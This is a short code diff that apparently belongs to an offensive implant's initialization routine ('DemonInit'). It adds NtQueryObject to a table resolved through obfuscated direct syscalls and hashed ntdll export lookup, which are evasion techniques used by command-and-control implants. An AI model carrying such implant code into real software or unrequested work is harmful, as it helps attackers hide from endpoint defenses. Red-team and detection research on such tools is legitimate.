@@ -419,6 +419,7 @@ VOID DemonInit( VOID )
         Instance.Syscall.NtFreeVirtualMemory               = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtFreeVirtualMemory );
         Instance.Syscall.NtQueryVirtualMemory              = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQueryVirtualMemory );
         Instance.Syscall.NtQueryInformationToken           = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQueryInformationToken );
+        Instance.Syscall.NtQueryObject                     = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQueryObject );
 
         MemSet( Syscalls, 0, sizeof( SYSCALL_STUB ) * MAX_NUMBER_OF_SYSCALLS );
         Instance.Win32.LocalFree( Syscalls );
@@ -460,6 +461,7 @@ VOID DemonInit( VOID )
         Instance.Syscall.NtQueryVirtualMemory              = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueryVirtualMemory );
         Instance.Syscall.NtQueryInformationToken           = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueryInformationToken );
         Instance.Syscall.NtQueryInformationThread          = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueryInformationThread );
+        Instance.Syscall.NtQueryObject                     = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueryObject );
     }
 
     ModuleName[ 0 ] = 'A';
